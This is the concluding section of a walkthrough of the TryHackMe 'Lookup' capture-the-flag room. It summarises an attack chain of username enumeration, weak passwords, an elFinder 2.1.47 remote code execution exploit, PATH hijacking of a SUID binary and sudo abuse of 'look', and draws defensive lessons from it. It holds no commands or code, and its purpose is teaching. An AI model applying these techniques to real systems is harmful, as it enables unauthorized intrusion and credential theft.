In this walkthrough of the TryHackMe "Lookup" challenge, we saw how a combination of minor weaknesses could be chained to compromise a system fully. A seemingly harmless misconfiguration (detailed error messages on login) provided the first foothold by revealing a valid username. Weak password practices then allowed access to a web portal. An outdated third-party component (elFinder 2.1.47) with a known exploit granted remote code execution on the server. From there, classic privilege escalation techniques took over: enumerating for SUID binaries and sudo privileges. The custom `pwm` SUID program was exploited via PATH hijacking to disclose a user's password, and sudo rights on the `look` utility were abused to read protected files, including credentials and system secrets. Each step required understanding the underlying technology – whether it was Linux name resolution, web authentication logic, or OS permission mechanisms – and exploiting it in an unintended way.

The challenge underscores the importance of defense in depth: even if one layer (e.g., the web app) is compromised, proper hardening (no unusual SUID files, no unnecessary sudo permissions, strong passwords, etc.) can contain the damage. Conversely, from an attacker’s perspective, it demonstrates how persistence and systematic probing of a target can eventually reveal a weakness. By approaching the target methodically, we ensured that no avenue (network service, web vulnerability, local exploit) was left unchecked.

In an academic context, this case study serves as a comprehensive example of a multi-step attack, touching on a broad range of topics: networking, web security, system internals, and cryptography. Each technical finding was examined in depth:

* How DNS and hosts files work in Linux,
* How web applications can inadvertently leak information,
* How known CVEs are applied to exploit real systems,
* How Unix privilege controls (SUID, sudo) can be bypassed if misconfigured.

By preserving the narrative of the attacker’s journey and simultaneously explaining the technical details of each exploit, this write-up bridges practical pentesting and theoretical understanding. It highlights not just **what** was done, but **how** and **why** each step was possible, which is crucial for both attackers (to refine their methods) and defenders (to strengthen their systems).
